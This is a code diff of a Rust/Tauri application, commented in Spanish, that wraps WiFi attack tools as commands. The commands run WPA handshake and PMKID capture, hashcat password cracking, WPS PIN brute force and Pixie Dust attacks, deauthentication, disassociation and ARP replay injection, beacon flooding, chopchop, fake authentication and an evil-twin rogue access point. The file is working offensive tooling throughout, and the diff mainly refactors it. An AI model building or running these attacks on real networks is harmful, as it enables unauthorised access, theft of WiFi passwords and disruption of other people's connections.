@@ -1,6 +1,7 @@
 use serde::Serialize;
 use tauri::{command, AppHandle};
-use tauri_plugin_shell::{process::Output, ShellExt};
+use tauri_plugin_shell::process::Output;
+use tauri_plugin_shell::ShellExt;
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // PATHS
@@ -118,12 +119,17 @@ fn wrap(title: &str, body: &str, ok: bool) -> String {
 // ═══════════════════════════════════════════════════════════════════════════════
 #[command]
 pub async fn scan_wifi(app: AppHandle) -> ScanResult {
+    use std::time::Duration;
     let shell = app.shell();
-    let out: Output = match shell
-        .command("powershell")
-        .args(["-NoProfile", "-Command", "netsh wlan show networks mode=bssid"])
-        .output().await { Ok(o) => o, Err(e) => return ScanResult::err(&e.to_string()), };
-
+    let out: Output = match tokio::time::timeout(Duration::from_secs(10),
+        shell.command("powershell")
+            .args(["-NoProfile", "-Command", "netsh wlan show networks mode=bssid"])
+            .output()
+    ).await {
+        Ok(Ok(o)) => o,
+        Ok(Err(e)) => return ScanResult::err(&e.to_string()),
+        Err(_) => return ScanResult::err("Timeout: netsh wlan tardó más de 10s."),
+    };
     ScanResult::ok(parse_netsh(&String::from_utf8_lossy(&out.stdout)))
 }
 
@@ -136,7 +142,6 @@ pub async fn pmkid_capture(app: AppHandle, bssid: String, channel: Option<u8>, d
     let ch    = channel.unwrap_or(1);
     let dur   = duration_seconds.unwrap_or(120);
     let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));
-
     let mut args = vec![
         "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
         "-i".into(),
@@ -145,10 +150,9 @@ pub async fn pmkid_capture(app: AppHandle, bssid: String, channel: Option<u8>, d
         "--bssid".into(), bssid.clone(),
     ];
     if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
-
-    let r        = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
-    let body     = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture \u{00B7} {} \u{00B7} Canal={} \u{00B7} {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+    let r = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
+    let body = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture · {} · Canal={} · {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -160,11 +164,10 @@ pub async fn pmkid_convert(_app: AppHandle, pcapng_path: String, output_dir: Opt
     let out_dir = output_dir.as_deref().unwrap_or(".");
     let stem    = std::path::Path::new(&pcapng_path).file_stem().and_then(|s| s.to_str()).unwrap_or("out");
     let hash_file = format!("{}/{}.22000", out_dir, stem);
-
     let args = vec!["-o".into(), hash_file.clone(), pcapng_path.clone()];
     let r    = run_bin(&_app, prog.to_str().unwrap_or("hcxpcapngtool.exe"), &args).await;
     let body = format!("Input: {}\nOutput: {}\n\n{}", pcapng_path, hash_file, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("PMKID Convert \u{00B7} {pcapng_path}"), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+    CmdResponse { success: r.success, output: wrap(&format!("PMKID Convert · {pcapng_path}"), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -176,7 +179,6 @@ pub async fn pmkid_crack(app: AppHandle, hash_file: String, wordlist: Option<Str
     let wordlist_bin = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
     let mode     = attack_mode.unwrap_or(0);
     let cracked_out = format!("{}.cracked", hash_file);
-
     let args = vec![
         "-m".into(), "16800".into(),
         "-a".into(), mode.to_string(),
@@ -186,7 +188,6 @@ pub async fn pmkid_crack(app: AppHandle, hash_file: String, wordlist: Option<Str
         wordlist_bin.clone(),
     ];
     let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;
-
     let pw_opt   = r.output.lines().find(|l| l.contains(':')).map(|s| s.to_string());
     let body = if let Some(ref p) = pw_opt {
         format!("\u{1F512} PASSWORD: {}\n\n{}", p, r.output)
@@ -204,7 +205,6 @@ pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String
     let prog = tool_path("BULLY_PATH", "bully.exe");
     let args = vec!["-b".into(), bssid.clone(), interface.clone()];
     let r    = run_bin(&app, prog.to_str().unwrap_or("bully.exe"), &args).await;
-
     let summary = if r.output.to_lowercase().contains("pin:") {
         let pins: Vec<_> = r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect();
         let psks: Vec<_> = r.output.lines().filter(|l| l.to_lowercase().contains("psk:")).collect();
@@ -214,7 +214,6 @@ pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String
     } else {
         "bully ejecutado. Revisa la salida para el progreso del PIN.".into()
     };
-
     CmdResponse {
         success:    false,
         output:     wrap(&format!("WPS Bruteforce \u{00B7} {} \u{00B7} {interface}", bssid), &summary, false),
@@ -224,17 +223,13 @@ pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 6 — SCAN AIRODUMP-STYLE  (airodump-ng Windows nativo)
+// COMANDO 6 — SCAN AIRODUMP  (airodump-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Escanea redes con airodump-ng (Windows nativo) por la duracion indicada.
-/// Usa --write-interval 1000 para CSV actualizado cada segundo.
-/// Devuelve el stdout de airodump-ng para que el frontend lo parsee.
 #[command]
 pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> CmdResponse {
     let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
     let ch   = channel_filter.unwrap_or(0);
     let dur  = duration_secs.unwrap_or(60);
-
     let mut args = vec![
         "--write-interval".into(), "1000".into(),
         "--output-format".into(), "csv".into(),
@@ -242,72 +237,12 @@ pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel
     if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
     if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
     args.push("wlan0mon".into());
-
     let r = run_bin(&app, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
     let body = format!("Binario: {}\nCanal: {}  Duracion: {}s\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, r.output);
     CmdResponse { success: r.success, output: wrap("AIRODUMP Scan", &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 14 — ARP REPLAY INJECT  (aireplay-ng via WSL2)
-// ═══════════════════════════════════════════════════════════════════════════════
-/// Inyecta paquetes ARP reply para amplificar/inyectar tráfico de datos.
-/// Útil para acelerar la captura de handshake o generar tráfico WEP IV.
-///
-/// - address=ff:ff:ff:ff:ff:ff → broadcast (inyecta todo dispositivo)
-/// - address=<target-mac>     → unicast a un equipo específico
-/// - target_bssid es el BSSID del AP objetivo
-/// Si se omite `count`, aireplay-ng envia paquetes hasta Ctrl+C.
-#[command]
-pub async fn arp_replay_inject(app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
-    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
-    let iface    = iface.unwrap_or_else(|| "wlan0mon".into());
-    let addr     = address.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
 
-    let args = vec![
-        "--arpreply".into(),
-        "-b".into(), target_bssid.clone(),
-        "-h".into(), addr.clone(),
-        iface.clone(),
-    ];
-
-    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
-    let body = format!("Binario: {}\nBSSID: {}\nMAC fake: {}\nInterface: {}\n\n{}", prog.display(), target_bssid, addr, iface, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("ARP Replay \u{00B7} {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 15 — BEACON FLOOD  (mdk3 via WSL2)
-// ═══════════════════════════════════════════════════════════════════════════════
-/// Inunda el aire con beacons falsos de un AP virtual.
-/// Crea la ilusin de un AP adicional en el espectro WiFi.
-///
-/// - essid: nombre de la red falsa
-/// - bssid: MAC del AP falso (por defecto aleatoria)
-/// - channel: canal a usar (por defecto 1)
-/// - beacon_count: numero de beacons a inyectar antes de parar (0 = indefinido)
-#[command]
-pub async fn beacon_flood(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>) -> CmdResponse {
-    let prog  = tool_path("MDK3_PATH", "mdk3.exe");
-    let bssid = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
-    let ch    = channel.unwrap_or(1).to_string();
-    let cnt   = beacon_count.unwrap_or(50);
-
-    let mut args = vec![
-        "wlan0mon".into(), "b".into(),
-        "-c".into(), ch.clone(),
-        "-n".into(), essid.clone(),
-        "-s".into(), cnt.to_string(),
-    ];
-    args.push("-a".into()); args.push(bssid.clone());
-
-    let r = run_bin(&app, prog.to_str().unwrap_or("mdk3.exe"), &args).await;
-    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nBeacons: {}\n\n{}", prog.display(), essid, bssid, ch, cnt, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("Beacon Flood \u{00B7} {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// HELPER
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 7 — ESTADO DE INTERFAZ WiFi
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -341,12 +276,10 @@ pub async fn kill_attack_process(_app: AppHandle, pid: u32) -> CmdResponse {
     CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
 }
 
+
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 10 — CAPTURAR HANDSHAKE WPA/WPA2 (EAPOL 4-way)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Captura trafico 802.11 con hcxdumptool y extrae el handshake EAPOL
-/// completo con hcxpcapngtool (-k plaintext).
-/// Salida: handshake_<BSSID>.pcapng + handshake_<BSSID>.hccapx
 #[command]
 pub async fn capture_handshake(app: AppHandle, bssid: String, essid: Option<String>, channel: Option<u8>, duration_seconds: Option<u64>) -> CmdResponse {
     let dur  = duration_seconds.unwrap_or(60);
@@ -354,7 +287,6 @@ pub async fn capture_handshake(app: AppHandle, bssid: String, essid: Option<Stri
     let bssid_clean = bssid.replace(':', "");
     let pcap  = format!("handshake_{}.pcapng", bssid_clean);
     let hccapx = format!("handshake_{}.hccapx", bssid_clean);
-
     let mut args = vec![
         "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
         "-i".into(), "-t".into(), dur.to_string(),
@@ -362,65 +294,37 @@ pub async fn capture_handshake(app: AppHandle, bssid: String, essid: Option<Stri
         "--bssid".into(), bssid.clone(),
         "--channel".into(), ch.to_string(),
     ];
-    if let Some(ref e) = essid {
-        args.push("--essid".into());
-        args.push(e.clone());
-    }
-
+    if let Some(ref e) = essid { args.push("--essid".into()); args.push(e.clone()); }
     let prog  = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
     let cap  = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
-
     let conv = if cap.success {
         let prog2 = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
         let c_args = vec!["-k".into(), "-o".into(), hccapx.clone(), pcap.clone()];
         run_bin(&app, prog2.to_str().unwrap_or("hcxpcapngtool.exe"), &c_args).await
-    } else {
-        CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code }
-    };
-
-    let body = format!(
-        "Paso 1 — Captura:\n{}\n{}\n\nPaso 2 — Extraccion EAPOL:\n{}\n{}\nArchivo handshake: {}",
-        prog.display(), cap.output,
-        tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe").display(), conv.output,
-        hccapx
-    );
+    } else { CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code } };
+    let body = format!("Paso 1 — Captura:\n{}\n\nPaso 2 — Extraccion EAPOL:\n{}\nArchivo: {}", cap.output, conv.output, hccapx);
     let ok = conv.success;
-    CmdResponse {
-        success: ok,
-        output: wrap(&format!("Handshake Capture \u{00B7} {} \u{00B7} Canal={} \u{00B7} {}s", bssid, ch, dur), &body, ok),
-        stderr: format!("{}\n{}", cap.stderr, conv.stderr),
-        exit_code: conv.exit_code,
-    }
+    CmdResponse { success: ok, output: wrap(&format!("Handshake Capture · {} · Canal={} · {}s", bssid, ch, dur), &body, ok), stderr: format!("{}\n{}", cap.stderr, conv.stderr), exit_code: conv.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 11 — CRACK HANDSHAKE WPA/WPA2 (hashcat modo 22000)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Fuerza bruta sobre handshakes .hccapx / .22000 con hashcat modo 22000.
-/// -a 0 = straight, -a 3 = brute-force, -a 6 = dict+rule, -a 8 = PRINCE
-/// Soporta --session para pausar/reanudar y --restore para continuar
 #[command]
 pub async fn crack_handshake(app: AppHandle, hash_file: String, wordlist: Option<String>, attack_mode: Option<u8>, session_name: Option<String>) -> CmdResponse {
     let prog          = tool_path("HASHCAT_PATH", "hashcat.exe");
     let wordlist_bin  = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
-    let mode_str      = "22000";   // WPA/WPA2 PBKDF2-PMKID
+    let mode_str      = "22000";
     let atk           = attack_mode.unwrap_or(0);
     let cracked_out   = format!("{}.cracked", hash_file);
-
     let args: Vec<String> = vec![
-        "-m".into(),            mode_str.into(),
-        "-a".into(),            atk.to_string(),
-        "-o".into(),            cracked_out.clone(),
-        "--force".into(),
-        "--status".into(),      "--status-timer=10".into(),
-        "--session".into(),     session_name.clone().unwrap_or_else(|| "uifipill".into()),
-        hash_file.clone(),
-        wordlist_bin.clone(),
+        "-m".into(), mode_str.into(), "-a".into(), atk.to_string(),
+        "-o".into(), cracked_out.clone(), "--force".into(),
+        "--status".into(), "--status-timer=10".into(),
+        "--session".into(), session_name.clone().unwrap_or_else(|| "uifipill".into()),
+        hash_file.clone(), wordlist_bin.clone(),
     ];
-
     let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;
-
-    // parsear linea resumen "Hash.Target......: password" si existe
     let pw_opt = r.output.lines().find(|l| l.contains(':') && !l.starts_with('#')).map(|s| s.to_string());
     let body   = if let Some(ref p) = pw_opt {
         format!("\u{1F512} PASSWORD CRACKEADA:\n{}\n\n{}", p, r.output)
@@ -428,153 +332,343 @@ pub async fn crack_handshake(app: AppHandle, hash_file: String, wordlist: Option
         format!("Sin resultado aun.\nHash: {}\nModo: {}  Ataque: {}  Wordlist: {}\n\n{}", hash_file, mode_str, atk, wordlist_bin, r.output)
     };
     let ok = pw_opt.is_some();
-    CmdResponse {
-        success: ok,
-        output:  wrap(&format!("Handshake Crack \u{00B7} {hash_file} \u{00B7} -a{atk}"), &body, ok),
-        stderr:  r.stderr,
-        exit_code: r.exit_code,
-    }
+    CmdResponse { success: ok, output: wrap(&format!("Handshake Crack \u{00B7} {hash_file} \u{00B7} -a{atk}"), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
 }
+
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 12 — DEAUTH INJECTION  (aireplay-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Envía paquetes de desautenticación 802.11 para forzar un re-handshake WPA2.
-/// Requiere adaptador WSL2 y adaptador en modo monitor (aireplay-ng.exe).
-/// Uso: aireplay-ng --deauth <count> -a <BSSID> [-c <client>] <iface>
 #[command]
 pub async fn deauth_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
     let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
     let cnt  = count.unwrap_or(10);
     let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
-
-    let mut args = vec![
-        "--deauth".into(), cnt.to_string(),
-        "-a".into(), bssid.clone(),
-    ];
+    let mut args = vec!["--deauth".into(), cnt.to_string(), "-a".into(), bssid.clone()];
     if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
     args.push(iface_in.clone());
-
     let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
     let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("Deauth \u{00B7} {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+    CmdResponse { success: r.success, output: wrap(&format!("Deauth · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 13 — DISASSOC INJECTION  (aireplay-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Envía paquetes de desasociación 802.11 (menos intrusivo que deauth).
-/// Requiere aireplay-ng.exe instalado + adaptador en modo monitor.
 #[command]
 pub async fn disassoc_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
     let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
     let cnt  = count.unwrap_or(5);
     let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
-
-    let mut args = vec![
-        "--disassociate".into(), cnt.to_string(),
-        "-a".into(), bssid.clone(),
-    ];
+    let mut args = vec!["--disassociate".into(), cnt.to_string(), "-a".into(), bssid.clone()];
     if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
     args.push(iface_in.clone());
-
     let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
     let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("Disassoc \u{00B7} {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+    CmdResponse { success: r.success, output: wrap(&format!("Disassoc · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 14 — ARP REPLAY INJECT  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn arp_replay_inject(app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
+    let addr     = address.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
+    let args = vec!["--arpreply".into(), "-b".into(), target_bssid.clone(), "-h".into(), addr.clone(), iface_in.clone()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nMAC fake: {}\nInterface: {}\n\n{}", prog.display(), target_bssid, addr, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("ARP Replay · {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 15 — BEACON FLOOD  (mdk3 Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn beacon_flood(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>) -> CmdResponse {
+    let prog  = tool_path("MDK3_PATH", "mdk3.exe");
+    let bssid = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
+    let ch    = channel.unwrap_or(1).to_string();
+    let cnt   = beacon_count.unwrap_or(50);
+    let mut args = vec!["wlan0mon".into(), "b".into(), "-c".into(), ch.clone(), "-n".into(), essid.clone(), "-s".into(), cnt.to_string()];
+    args.push("-a".into()); args.push(bssid.clone());
+    let r = run_bin(&app, prog.to_str().unwrap_or("mdk3.exe"), &args).await;
+    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nBeacons: {}\n\n{}", prog.display(), essid, bssid, ch, cnt, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Beacon Flood · {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 16 — WPS PBC  (reaver-wps push-button mode)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Ataca WPS Push-Button Configuration (PBC).
-/// Usa reaver-wps en modo -S (pbc-only): espera a que el usuario pulse WPS en el router
-/// o realiza un ataque de fuerza bruta de estado PBC.
-///
-/// -S  activa modo solo-PBC (sin PIN)
-/// -vv verbose
-/// -L lockout de 60s entre reintentos
 #[command]
 pub async fn wps_pbc_attack(app: AppHandle, bssid: String, iface: Option<String>) -> CmdResponse {
     let prog = tool_path("REAVER_PATH", "reaver-wps-fork-t6x.exe");
     let iface_in  = iface.unwrap_or_else(|| "wlan0".into());
-
-    let args = vec![
-        "-i".into(), iface_in.clone(),
-        "-b".into(), bssid.clone(),
-        "-S".into(),
-        "-vv".into(),
-        "-L".into(),
-    ];
-
+    let args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-S".into(), "-vv".into(), "-L".into()];
     let r = run_bin(&app, prog.to_str().unwrap_or("reaver-wps-fork-t6x.exe"), &args).await;
     let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nModo: WPS PBC (-S)\n\n{}", prog.display(), bssid, iface_in, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("WPS PBC \u{00B7} {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+    CmdResponse { success: r.success, output: wrap(&format!("WPS PBC · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 17 — CHOPCHOP INJECT  (aireplay-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Ataque ChopChop de aireplay-ng.
-/// Descifra paquetes WEP en tiempo real generando IVs nuevos, sin necesidad de conocer la clave.
-/// El resultado se puede mezclar con Packetforge para crear paquetes de datos inyectables.
-/// Es util para redes WEP legacy y como paso previo al ataque ARP replay.
-///
-/// --arpreplay-mode: arpreplay para WEP
-/// -b:  BSSID objetivo
-/// -h:  direccion MAC origen (falsa)
-/// -F: archivo de salida con paquetes descifrados
 #[command]
 pub async fn chopchop_inject(app: AppHandle, target_bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
     let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
     let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
     let src_mac   = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
-
     let out_file = format!("chopchop_{}.xor", target_bssid.replace(':', ""));
-
-    let args = vec![
-        "--chopchop".into(),
-        "-b".into(), target_bssid.clone(),
-        "-h".into(), src_mac.clone(),
-        "-F".into(), out_file.clone(),
-        iface_in.clone(),
-    ];
-
+    let args = vec!["--chopchop".into(), "-b".into(), target_bssid.clone(), "-h".into(), src_mac.clone(), "-F".into(), out_file.clone(), iface_in.clone()];
     let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
     let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\nSalida: {}\n\n{}", prog.display(), target_bssid, src_mac, iface_in, out_file, r.output);
-    CmdResponse { success: r.success, output: wrap(&format!("ChopChop \u{00B7} {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+    CmdResponse { success: r.success, output: wrap(&format!("ChopChop · {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 18 — EVIL TWIN / ROGUE AP  (airbase-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Crea un AP falso (Evil Twin / Rogue AP) con airbase-ng.
-/// El AP se identifica por el BSSID real a emular. El propio airbase-ng puede
-/// capturar el handshake WPA2 de clientes que se conecten, o redirigir trafico a Internet.
-///
-/// Opciones principales:
-/// -e: ESSID del AP falso
-/// -b: BSSID a clonar
-/// -c: canal
-/// -W: WEP (0=abierta, 1=WEP, 2=WPA, 3=WPA2)
-/// --essid / --bssid / --channel son sinonimos
 #[command]
 pub async fn rogue_ap(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, iface: Option<String>) -> CmdResponse {
     let prog = tool_path("AIRBASE_PATH", "airbase-ng.exe");
     let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
     let bssid_val = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
     let ch        = channel.unwrap_or(1);
-
-    let args = vec![
-        "--essid".into(), essid.clone(),
-        "-b".into(), bssid_val.clone(),
-        "-c".into(), ch.to_string(),
-        "-W".into(), "2".into(),   // WPA-PSK
-        iface_in.clone(),
-    ];
-
+    let args = vec!["--essid".into(), essid.clone(), "-b".into(), bssid_val.clone(), "-c".into(), ch.to_string(), "-W".into(), "2".into(), iface_in.clone()];
     let r = run_bin(&app, prog.to_str().unwrap_or("airbase-ng.exe"), &args).await;
-    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nInterface: {}\n\n{}",
-        prog.display(), essid, bssid_val, ch, iface_in, r.output);
+    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nInterface: {}\n\n{}", prog.display(), essid, bssid_val, ch, iface_in, r.output);
     CmdResponse { success: r.success, output: wrap(&format!("Rogue AP \u{00B7} {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 19 — INJECTION TEST  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn injection_test(app: AppHandle, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
+    let args = vec!["--test".into(), iface_in.clone()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nInterface: {}\n\n{}", prog.display(), iface_in, r.output);
+    let ok = r.output.contains("injection is working") || r.output.contains("Injection is working");
+    CmdResponse { success: r.success || ok, output: wrap(&format!("Injection Test · {}", iface_in), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 20 — FAKEAUTH INJECT  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn fakeauth_inject(app: AppHandle, bssid: String, source_mac: Option<String>, delay: Option<u8>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let src_mac = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
+    let dly = delay.unwrap_or(1);
+    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
+    let args = vec!["--fakeauth".into(), dly.to_string(), "-a".into(), bssid.clone(), "-h".into(), src_mac.clone(), iface_in.clone()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nDelay: {}s\nInterface: {}\n\n{}", prog.display(), bssid, src_mac, dly, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Fakeauth · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 21 — WPS PIXIE DUST  (reaver-wps -K 1)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn wps_pixiedust(app: AppHandle, bssid: String, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("REAVER_PATH", "reaver-wps-fork-t6x.exe");
+    let iface_in = iface.unwrap_or_else(|| "wlan0".into());
+    let args = vec!["-i".into(), iface_in.clone(), "-b".into(), bssid.clone(), "-K".into(), "1".into(), "-vv".into(), "-L".into()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("reaver-wps-fork-t6x.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nModo: Pixie Dust (-K 1)\n\n{}", prog.display(), bssid, iface_in, r.output);
+    let ok = r.output.contains("WPS PIN:") || r.output.contains("Pin:");
+    CmdResponse { success: ok || r.success, output: wrap(&format!("WPS Pixie Dust · {}", bssid), &body, ok), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
